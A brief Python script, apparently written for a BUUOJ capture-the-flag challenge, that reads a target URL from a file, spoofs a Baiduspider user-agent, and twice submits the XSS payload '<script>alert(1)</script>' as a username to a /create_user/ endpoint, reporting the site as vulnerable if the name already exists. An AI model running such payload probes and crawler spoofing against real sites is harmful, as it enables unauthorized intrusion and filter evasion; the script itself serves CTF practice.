import time

import requests

#   node4.buuoj.cn:28977
headers = {
    'user-agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'
}

with open(r'urls.txt',mode='rt',encoding='utf-8') as f:
    url = f.readline()

    a = requests.get(url=url + "/create_user/?username=<script>alert(1)</script>",headers=headers)
    time.sleep(0.05)
    b = requests.get(url=url + '/create_user/?username=<script>alert(1)</script>', headers=headers)

    if "already exists" in b.text:
        print(url + "存在XSS漏洞")
